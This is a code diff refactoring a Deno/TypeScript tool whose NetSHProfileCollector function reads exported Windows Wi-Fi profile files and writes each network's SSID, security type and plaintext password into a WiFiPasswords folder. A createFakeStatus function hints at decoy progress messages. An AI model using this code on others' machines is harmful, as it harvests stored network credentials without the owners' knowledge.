@@ -1,4 +1,4 @@
-import { TerminalSpinner, SpinnerTypes } from '@spinners';
+import { SpinnerTypes, TerminalSpinner } from '@spinners';
 import { Select } from '@cliffy/select';
 import colors from '@colors';
 import { delay } from '@std';
@@ -100,18 +100,14 @@ async function NetSHProfileCollector() {
 		const content = await Deno.readTextFile(`.tempdata/${file.name}`);
 
 		// Filtrando tags que são úteis
-		const name = clearTags(content.match(/<name>.*?<\/name>/));
-		const securityLevel = clearTags(
-			content.match(/<authentication>.*?<\/authentication>/),
-		);
-		const password = clearTags(
-			content.match(/<keyMaterial>.*?<\/keyMaterial>/),
-		);
+		const [name, , security, password] = clearTags(content.matchAll(
+			/<(name|authentication|keyMaterial)>.*?<\/.*>/g,
+		));
 
 		// Escrevendo arquivos com as informações filtradas no diretório final
 		Deno.writeTextFileSync(
 			`WiFiPasswords/${name}.txt`,
-			`SSID: ${name}\nSecurity Level: ${securityLevel}\nPassword: ${password}`,
+			`SSID: ${name}\nSecurity Level: ${security}\nPassword: ${password}`,
 		);
 	}
 
@@ -183,10 +179,16 @@ async function createFakeStatus(loadingMsg: string, completeMsg: string) {
 	return;
 }
 
-function clearTags(text: RegExpMatchArray | string | null) {
+function clearTags(matches: IterableIterator<RegExpMatchArray>) {
 	// Regex pra filtrar as tags do XML
-	return String(text)
-		.replace(/<\/?[a-z][a-z0-9]*[^<>]*>|<!--.*?-->/gim, '');
+	const res: string[] = [];
+	for (const match of matches) {
+		res.push(
+			String(match[0])
+				.replace(/<.*?>/g, ''),
+		);
+	}
+	return res;
 }
 
 function random() {
